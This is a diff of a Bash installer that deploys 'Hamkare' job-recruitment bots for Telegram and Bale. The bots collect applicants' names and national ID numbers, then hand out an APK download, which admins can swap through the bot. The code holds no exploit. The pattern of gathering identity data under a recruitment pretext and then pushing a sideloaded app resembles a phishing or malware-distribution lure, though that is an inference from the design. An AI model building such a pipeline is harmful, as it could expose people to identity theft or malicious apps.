@@ -3,160 +3,169 @@ set -Eeuo pipefail
 umask 077
 
 [[ $EUID -eq 0 ]] || { echo 'این دستور را با root اجرا کنید.'; exit 1; }
-command -v python3 >/dev/null || { apt-get update && apt-get install -y python3; }
+if ! command -v python3 >/dev/null || ! command -v apksigner >/dev/null; then
+  apt-get update
+  apt-get install -y python3 apksigner
+fi
+command -v realpath >/dev/null || { echo 'realpath در دسترس نیست.' >&2; exit 1; }
+
+SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
+SOURCE_BOT="$SCRIPT_DIR/bot/hamkare_bot.py"
+[[ -f "$SOURCE_BOT" ]] || { echo "فایل بات پیدا نشد: $SOURCE_BOT" >&2; exit 1; }
 
 APP="${HAMKARE_APP_DIR:-/opt/hamkare-bots}"
-HAMKARE_DOWNLOAD_URL="${HAMKARE_DOWNLOAD_URL:-https://seskia.online/est/download}"
+BRAND_NAME="${BRAND_NAME:-همکاره}"
+SITE_URL="${SITE_URL:-https://adlisho.online}"
+DOWNLOAD_URL="${HAMKARE_DOWNLOAD_URL:-https://seskia.online/est/download}"
+SUPPORT_URL="${SUPPORT_URL:-https://adlisho.online/contact.html}"
+PRIVACY_URL="${PRIVACY_URL:-https://adlisho.online/privacy.html}"
+TRACKING_URL="${TRACKING_URL:-https://adlisho.online/result.html}"
 TELEGRAM_BOT_USERNAME="${TELEGRAM_BOT_USERNAME:-Pasokh313e_bot}"
 BALE_BOT_USERNAME="${BALE_BOT_USERNAME:-Hamkarebot}"
-mkdir -p "$APP"
+APK_DEPLOY_PATH="${APK_DEPLOY_PATH:-/var/www/seskia/app.apk}"
+MAX_APK_BYTES="${MAX_APK_BYTES:-20971520}"
 
-[[ "$HAMKARE_DOWNLOAD_URL" =~ ^https://[^[:space:]]+$ ]] || { echo 'لینک دانلود باید یک URL کامل HTTPS باشد.'; exit 1; }
-[[ "$TELEGRAM_BOT_USERNAME" =~ ^[A-Za-z0-9_]{5,32}$ ]] || { echo 'نام کاربری ربات تلگرام معتبر نیست.'; exit 1; }
-[[ "$BALE_BOT_USERNAME" =~ ^[A-Za-z0-9_]{5,32}$ ]] || { echo 'نام کاربری بازوی بله معتبر نیست.'; exit 1; }
+prompt_secret() {
+  local variable_name="$1" prompt="$2" value="${!1:-}"
+  if [[ -z "$value" ]]; then read -rsp "$prompt" value; echo; fi
+  printf -v "$variable_name" '%s' "$value"
+}
 
-read -rsp "توکن تلگرام @${TELEGRAM_BOT_USERNAME}: " TG_TOKEN; echo
-read -rp 'آیدی عددی گروه گزارش تلگرام (معمولاً با -100): ' TG_LOG
-read -rsp "توکن بله @${BALE_BOT_USERNAME}: " BALE_TOKEN; echo
-read -rp 'آیدی عددی گروه گزارش بله: ' BALE_LOG
+prompt_value() {
+  local variable_name="$1" prompt="$2" value="${!1:-}"
+  if [[ -z "$value" ]]; then read -rp "$prompt" value; fi
+  printf -v "$variable_name" '%s' "$value"
+}
 
-[[ "$TG_TOKEN" == *:* && "$BALE_TOKEN" == *:* ]] || { echo 'فرمت توکن صحیح نیست.'; exit 1; }
-[[ "$TG_LOG" =~ ^-?[0-9]+$ && "$BALE_LOG" =~ ^-?[0-9]+$ ]] || { echo 'آیدی گروه باید عددی باشد.'; exit 1; }
+prompt_secret TG_TOKEN "توکن تلگرام @${TELEGRAM_BOT_USERNAME}: "
+prompt_value TG_LOG 'آیدی عددی گروه گزارش تلگرام (معمولاً با -100): '
+prompt_value TG_ADMIN_IDS 'آیدی عددی مدیران تلگرام (با کاما جدا کنید): '
+prompt_secret BALE_TOKEN "توکن بله @${BALE_BOT_USERNAME}: "
+prompt_value BALE_LOG 'آیدی عددی گروه گزارش بله: '
+prompt_value BALE_ADMIN_IDS 'آیدی عددی مدیران بله (با کاما جدا کنید): '
 
-cp -a "$APP" "$APP.backup.$(date +%Y%m%d-%H%M%S)" 2>/dev/null || true
+[[ "$TG_TOKEN" =~ ^[A-Za-z0-9_:-]{20,200}$ && "$BALE_TOKEN" =~ ^[A-Za-z0-9_:-]{20,200}$ ]] || {
+  echo 'فرمت توکن صحیح نیست.' >&2; exit 1;
+}
+[[ "$TG_LOG" =~ ^-?[0-9]+$ && "$BALE_LOG" =~ ^-?[0-9]+$ ]] || {
+  echo 'آیدی گروه باید عددی باشد.' >&2; exit 1;
+}
+[[ "$TG_ADMIN_IDS" =~ ^[0-9]+(,[0-9]+)*$ && "$BALE_ADMIN_IDS" =~ ^[0-9]+(,[0-9]+)*$ ]] || {
+  echo 'آیدی مدیران باید عددی و با کاما جدا شده باشد.' >&2; exit 1;
+}
+[[ "$TELEGRAM_BOT_USERNAME" =~ ^[A-Za-z0-9_]{5,32}$ ]] || { echo 'نام کاربری تلگرام معتبر نیست.' >&2; exit 1; }
+[[ "$BALE_BOT_USERNAME" =~ ^[A-Za-z0-9_]{5,32}$ ]] || { echo 'نام کاربری بله معتبر نیست.' >&2; exit 1; }
+[[ "$MAX_APK_BYTES" =~ ^[0-9]+$ && "$MAX_APK_BYTES" -ge 1048576 && "$MAX_APK_BYTES" -le 20971520 ]] || { echo 'MAX_APK_BYTES باید بین 1 و 20 مگابایت باشد.' >&2; exit 1; }
+[[ "$APP" =~ ^/(opt|srv)/[A-Za-z0-9._/-]+$ ]] || { echo 'HAMKARE_APP_DIR باید مسیر امنی زیر /opt یا /srv باشد.' >&2; exit 1; }
+APP="$(realpath -m -- "$APP")"
+[[ "$APP" == /opt/* || "$APP" == /srv/* ]] || { echo 'مسیر نهایی HAMKARE_APP_DIR باید زیر /opt یا /srv باشد.' >&2; exit 1; }
+[[ "$APK_DEPLOY_PATH" == /* && "$APK_DEPLOY_PATH" != *[[:space:]]* ]] || { echo 'APK_DEPLOY_PATH باید مسیر مطلق و بدون فاصله باشد.' >&2; exit 1; }
+APK_DEPLOY_PATH="$(realpath -m -- "$APK_DEPLOY_PATH")"
+[[ "$APK_DEPLOY_PATH" == *.apk ]] || { echo 'APK_DEPLOY_PATH باید به فایل .apk ختم شود.' >&2; exit 1; }
+[[ "$APK_DEPLOY_PATH" == /var/www/* || "$APK_DEPLOY_PATH" == /srv/* ]] || { echo 'مسیر نهایی APK باید زیر /var/www یا /srv باشد.' >&2; exit 1; }
+[[ -d "$(dirname "$APK_DEPLOY_PATH")" ]] || { echo "پوشه مقصد APK وجود ندارد: $(dirname "$APK_DEPLOY_PATH")" >&2; exit 1; }
+[[ ! -L "$APK_DEPLOY_PATH" ]] || { echo 'مسیر APK نباید symbolic link باشد.' >&2; exit 1; }
+APK_STAGE_DIR="${APK_STAGE_DIR:-$(dirname "$APK_DEPLOY_PATH")/.hamkare-apk-staging}"
+[[ "$APK_STAGE_DIR" == /* && "$APK_STAGE_DIR" != *[[:space:]]* ]] || { echo 'APK_STAGE_DIR باید مسیر مطلق و بدون فاصله باشد.' >&2; exit 1; }
+[[ ! -L "$APK_STAGE_DIR" ]] || { echo 'مسیر staging نباید symbolic link باشد.' >&2; exit 1; }
+APK_STAGE_DIR="$(realpath -m -- "$APK_STAGE_DIR")"
+[[ "$(dirname "$APK_STAGE_DIR")" == "$(dirname "$APK_DEPLOY_PATH")" && "$(basename "$APK_STAGE_DIR")" == .* ]] || { echo 'staging باید پوشه‌ای مخفی کنار APK باشد.' >&2; exit 1; }
+install -d -m 0700 "$APK_STAGE_DIR"
 
-cat > "$APP/bot.py" <<'PY'
-#!/usr/bin/env python3
-import hashlib, json, os, re, sqlite3, sys, time, urllib.request, urllib.error
+for url in "$SITE_URL" "$DOWNLOAD_URL" "$SUPPORT_URL" "$PRIVACY_URL" "$TRACKING_URL"; do
+  [[ "$url" =~ ^https://[^[:space:]]+$ ]] || { echo "لینک HTTPS معتبر نیست: $url" >&2; exit 1; }
+done
+[[ "$BRAND_NAME" != *$'\n'* && ${#BRAND_NAME} -le 50 ]] || { echo 'نام برند معتبر نیست.' >&2; exit 1; }
 
-PLATFORM=os.environ['PLATFORM']
-TOKEN=os.environ['BOT_TOKEN']
-LOG_CHAT=os.environ['LOG_CHAT_ID']
-BASE=('https://api.telegram.org/bot' if PLATFORM=='telegram' else 'https://tapi.bale.ai/bot')+TOKEN+'/'
-DB='/opt/hamkare-bots/hamkare.sqlite3'
-APK=os.environ['DOWNLOAD_URL']
+BACKUP=""
+if [[ -d "$APP" ]]; then
+  BACKUP="${APP}.backup.$(date +%Y%m%d-%H%M%S)"
+  cp -a "$APP" "$BACKUP"
+fi
 
-def api(method, payload):
-    data=json.dumps(payload,ensure_ascii=False).encode()
-    req=urllib.request.Request(BASE+method,data=data,headers={'Content-Type':'application/json'})
-    with urllib.request.urlopen(req,timeout=70) as r:
-        out=json.loads(r.read())
-    if not out.get('ok'): raise RuntimeError(out.get('description','API error'))
-    return out
-
-def send(chat,text,keyboard=None):
-    p={'chat_id':chat,'text':text}
-    if keyboard: p['reply_markup']={'inline_keyboard':keyboard}
-    return api('sendMessage',p)
-
-def answer(cid):
-    try: api('answerCallbackQuery',{'callback_query_id':cid})
-    except Exception: pass
-
-def norm(s):
-    return str(s).translate(str.maketrans('۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩','01234567890123456789')).strip()
-
-def valid_nid(code):
-    code=norm(code)
-    if not re.fullmatch(r'\d{10}',code) or len(set(code))==1: return False
-    return sum(int(code[i])*(10-i) for i in range(9))%11 < 2 and int(code[9])==sum(int(code[i])*(10-i) for i in range(9))%11 or sum(int(code[i])*(10-i) for i in range(9))%11 >= 2 and int(code[9])==11-sum(int(code[i])*(10-i) for i in range(9))%11
-
-con=sqlite3.connect(DB,timeout=30)
-con.execute('PRAGMA journal_mode=WAL')
-con.execute('CREATE TABLE IF NOT EXISTS sessions(platform TEXT,user_id TEXT,state TEXT,first_name TEXT,last_name TEXT,nid TEXT,PRIMARY KEY(platform,user_id))')
-con.execute('CREATE TABLE IF NOT EXISTS registrations(id INTEGER PRIMARY KEY,platform TEXT,user_id TEXT,national_hash TEXT,created_at TEXT DEFAULT CURRENT_TIMESTAMP,UNIQUE(platform,user_id),UNIQUE(platform,national_hash))')
-con.commit()
-
-def row(uid):
-    return con.execute('SELECT state,first_name,last_name,nid FROM sessions WHERE platform=? AND user_id=?',(PLATFORM,uid)).fetchone()
-def session(uid,state,first='',last='',nid=''):
-    con.execute('INSERT OR REPLACE INTO sessions VALUES(?,?,?,?,?,?)',(PLATFORM,uid,state,first,last,nid)); con.commit()
-def download(chat):
-    send(chat,'✅ ثبت شما قبلاً تکمیل شده است. فایل استخدامی از دکمه زیر در دسترس است.',[[{'text':'📥 دریافت فایل استخدامی','url':APK}]])
-
-def process(update):
-    q=update.get('callback_query')
-    if q:
-        answer(q.get('id','')); uid=str(q['from']['id']); chat=q['message']['chat']['id']; data=q.get('data','')
-        r=row(uid)
-        if data=='cancel':
-            con.execute('DELETE FROM sessions WHERE platform=? AND user_id=?',(PLATFORM,uid)); con.commit(); send(chat,'ثبت لغو شد. برای شروع دوباره /start را بفرستید.'); return
-        if data!='consent' or not r or r[0]!='consent': return
-        first,last,nid=r[1],r[2],r[3]; h=hashlib.sha256(nid.encode()).hexdigest()
-        try:
-            con.execute('INSERT INTO registrations(platform,user_id,national_hash) VALUES(?,?,?)',(PLATFORM,uid,h)); con.commit()
-        except sqlite3.IntegrityError:
-            download(chat); return
-        mask=nid[:3]+'****'+nid[-3:]
-        username=q['from'].get('username'); uname=('@'+username) if username else 'ندارد'
-        log=f'📌 ثبت جدید همکاره\nبستر: {"تلگرام" if PLATFORM=="telegram" else "بله"}\nنام: {first}\nنام خانوادگی: {last}\nکد ملی: {mask}\nشناسه کاربر: {uid}\nنام کاربری: {uname}\nرضایت: تأیید شد'
-        try: send(LOG_CHAT,log)
-        except Exception:
-            con.execute('DELETE FROM registrations WHERE platform=? AND user_id=?',(PLATFORM,uid)); con.commit(); send(chat,'ارسال ثبت به گروه انجام نشد. لطفاً کمی بعد دوباره تأیید کنید.'); return
-        con.execute('DELETE FROM sessions WHERE platform=? AND user_id=?',(PLATFORM,uid)); con.commit()
-        send(chat,'✅ مشخصات شما ثبت شد. اکنون فایل استخدامی را دریافت کنید.',[[{'text':'📥 دریافت فایل استخدامی','url':APK}]])
-        return
-    m=update.get('message');
-    if not m or m.get('chat',{}).get('type')!='private': return
-    chat=m['chat']['id']; uid=str(m.get('from',{}).get('id',chat)); text=norm(m.get('text',''))
-    if text.startswith('/start'):
-        if con.execute('SELECT 1 FROM registrations WHERE platform=? AND user_id=?',(PLATFORM,uid)).fetchone(): download(chat); return
-        session(uid,'first'); send(chat,'سلام 👋\nبه سامانه استخدام «همکاره» خوش آمدید.\n\nلطفاً نام خود را وارد کنید:'); return
-    r=row(uid)
-    if not r: send(chat,'برای شروع ثبت‌نام /start را بفرستید.'); return
-    state,first,last,nid=r
-    if state=='first':
-        if len(text)<2 or len(text)>50: send(chat,'نام معتبر وارد کنید.'); return
-        session(uid,'last',text); send(chat,'نام خانوادگی خود را وارد کنید:')
-    elif state=='last':
-        if len(text)<2 or len(text)>70: send(chat,'نام خانوادگی معتبر وارد کنید.'); return
-        session(uid,'nid',first,text); send(chat,'کد ملی ۱۰ رقمی خود را وارد کنید:')
-    elif state=='nid':
-        if not valid_nid(text): send(chat,'کد ملی معتبر نیست؛ دوباره وارد کنید.'); return
-        session(uid,'consent',first,last,text)
-        send(chat,f'اطلاعات شما:\nنام: {first}\nنام خانوادگی: {last}\nکد ملی: {text[:3]}****{text[-3:]}\n\nبا تأیید، مشخصات برای بررسی استخدامی به گروه مسئول همکاره ارسال می‌شود.',[[{'text':'✅ تأیید و ثبت','callback_data':'consent'}],[{'text':'❌ لغو','callback_data':'cancel'}]])
-
-offset=0
-try: api('deleteWebhook',{'drop_pending_updates':False})
-except Exception: pass
-while True:
-    try:
-        out=api('getUpdates',{'offset':offset,'timeout':50,'allowed_updates':['message','callback_query']})
-        for u in out.get('result',[]):
-            offset=max(offset,int(u['update_id'])+1); process(u)
-    except Exception as e:
-        print(e,file=sys.stderr,flush=True); time.sleep(3)
-PY
-chmod 750 "$APP/bot.py"
+install -d -m 0700 "$APP"
+install -m 0750 "$SOURCE_BOT" "$APP/bot.py"
 
 cat > "$APP/telegram.env" <<EOF
 PLATFORM=telegram
 BOT_TOKEN=$TG_TOKEN
 LOG_CHAT_ID=$TG_LOG
-DOWNLOAD_URL=$HAMKARE_DOWNLOAD_URL
+ADMIN_IDS=$TG_ADMIN_IDS
+BRAND_NAME=$BRAND_NAME
+DOWNLOAD_URL=$DOWNLOAD_URL
+SITE_URL=$SITE_URL
+SUPPORT_URL=$SUPPORT_URL
+PRIVACY_URL=$PRIVACY_URL
+TRACKING_URL=$TRACKING_URL
+DATABASE_PATH=$APP/hamkare.sqlite3
+APK_UPLOAD_ENABLED=true
+APK_DEPLOY_PATH=$APK_DEPLOY_PATH
+APK_STAGE_DIR=$APK_STAGE_DIR
+MAX_APK_BYTES=$MAX_APK_BYTES
+PUBLIC_VERIFY_ENABLED=true
 EOF
+
 cat > "$APP/bale.env" <<EOF
 PLATFORM=bale
 BOT_TOKEN=$BALE_TOKEN
 LOG_CHAT_ID=$BALE_LOG
-DOWNLOAD_URL=$HAMKARE_DOWNLOAD_URL
+ADMIN_IDS=$BALE_ADMIN_IDS
+BRAND_NAME=$BRAND_NAME
+DOWNLOAD_URL=$DOWNLOAD_URL
+SITE_URL=$SITE_URL
+SUPPORT_URL=$SUPPORT_URL
+PRIVACY_URL=$PRIVACY_URL
+TRACKING_URL=$TRACKING_URL
+DATABASE_PATH=$APP/hamkare.sqlite3
+APK_UPLOAD_ENABLED=false
+APK_DEPLOY_PATH=
+APK_STAGE_DIR=
+MAX_APK_BYTES=$MAX_APK_BYTES
+PUBLIC_VERIFY_ENABLED=false
 EOF
 chmod 600 "$APP"/*.env
 
-for p in telegram bale; do
-cat > "/etc/systemd/system/hamkare-$p.service" <<EOF
+for platform in telegram bale; do
+  read_write_paths="$APP"
+  if [[ "$platform" == telegram ]]; then
+    read_write_paths="$read_write_paths $(dirname "$APK_DEPLOY_PATH")"
+  fi
+  cat > "/etc/systemd/system/hamkare-$platform.service" <<EOF
 [Unit]
-Description=Hamkare $p recruitment bot
+Description=Hamkare $platform recruitment bot
 After=network-online.target
+Wants=network-online.target
+
 [Service]
 Type=simple
-EnvironmentFile=$APP/$p.env
-ExecStart=/usr/bin/python3 $APP/bot.py
+WorkingDirectory=$APP
+EnvironmentFile=$APP/$platform.env
+Environment=PYTHONUNBUFFERED=1
+ExecStart=/usr/bin/python3 -I $APP/bot.py
 Restart=always
 RestartSec=3
+TimeoutStopSec=20
+UMask=0077
 NoNewPrivileges=true
-ProtectHome=true
 PrivateTmp=true
+PrivateDevices=true
+ProtectSystem=strict
+ProtectHome=true
+ProtectHostname=true
+ProtectClock=true
+ProtectKernelTunables=true
+ProtectKernelModules=true
+ProtectKernelLogs=true
+ProtectControlGroups=true
+RestrictSUIDSGID=true
+RestrictRealtime=true
+LockPersonality=true
+CapabilityBoundingSet=
+AmbientCapabilities=
+SystemCallArchitectures=native
+RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
+ReadWritePaths=$read_write_paths
+
 [Install]
 WantedBy=multi-user.target
 EOF
@@ -164,13 +173,16 @@ done
 
 python3 -m py_compile "$APP/bot.py"
 systemctl daemon-reload
-systemctl enable --now hamkare-telegram hamkare-bale
+systemctl enable --now hamkare-telegram.service hamkare-bale.service
 sleep 3
-systemctl is-active --quiet hamkare-telegram
-systemctl is-active --quiet hamkare-bale
-echo '✅ هر دو بات همکاره فعال شدند.'
+systemctl is-active --quiet hamkare-telegram.service
+systemctl is-active --quiet hamkare-bale.service
+
+echo '✅ هر دو بات وایت‌لیبل همکاره فعال شدند.'
 echo "تلگرام: https://t.me/$TELEGRAM_BOT_USERNAME"
 echo "بله: https://ble.ir/$BALE_BOT_USERNAME"
-echo "دانلود: $HAMKARE_DOWNLOAD_URL"
-echo 'سایت: https://adlisho.online'
-echo 'تست: در هر دو بات /start بفرستید.'
+echo "دانلود ثابت: $DOWNLOAD_URL"
+echo "تعویض فایل APK: فقط مدیران @${TELEGRAM_BOT_USERNAME}"
+echo "مسیر APK: $APK_DEPLOY_PATH"
+[[ -z "$BACKUP" ]] || echo "بکاپ نسخه قبلی: $BACKUP"
+echo 'تست: /start را از یک حساب مدیر و یک حساب کاربر عادی در هر دو بات اجرا کنید.'
